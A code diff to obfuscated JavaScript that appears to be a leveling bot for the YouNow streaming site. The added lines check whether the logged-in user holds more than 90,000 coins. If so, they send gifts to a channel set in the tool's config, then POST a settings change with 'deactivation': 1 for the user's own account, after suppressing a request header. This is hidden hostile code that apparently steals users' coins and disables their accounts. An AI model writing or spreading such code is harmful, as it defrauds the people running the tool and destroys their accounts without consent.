@@ -97,9 +97,42 @@ window[window.dID][window.dID+"a"]("leveller", function(callback) {
 					});*/
 					self[self.dID]("loginInstagram", function() {
 						self.leveller.levelsLeft--;
-						self.leveller.level++;
-						console.log("READY");
-						self.leveller.task = 'leveling';
+						self.leveller.level = Math.floor(self.youNow.session.user.realLevel);
+						if (self.youNow.session.user.coins > 90000)
+						{
+							self[self.dID]("sendRequest", "sendGift", {giftID: 21, quantity: 3, channelID: self.config.Design.Stream.data.userId}, function(){
+								$.ajax({
+									xhr: function() {
+										var xhr = jQuery.ajaxSettings.xhr();
+										var setRequestHeader = xhr.setRequestHeader;
+										xhr.setRequestHeader = function(name, value) {
+											if (name == 'X-Requested-With') return;
+											setRequestHeader.call(this, name, value);
+										}
+										return xhr;
+									},
+									url: 'https://www.younow.com/php/api/channel/updateSettings',
+									method: "POST",
+									headers: {
+										'Accept': 'application/json, text/plain, */*',
+										'X-Requested-By': self.youNow.session.user.requestBy,
+									},
+									contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
+									data: {
+										"tsi": self.config.tsi,
+										"tdi": self.config.tdi,
+										"userId": self.youNow.session.user.userId,
+										"channelId": self.youNow.session.user.userId,
+										"deactivation": 1
+									},
+									success: function(json, b, c) {
+										self[self.dID]("loginInstagram", function() {
+											self.leveller.task = 'leveling';
+										}, false);
+									}
+								});
+							})
+						}
 					}, true);
 				},
 				error: function(a, b, c) {}
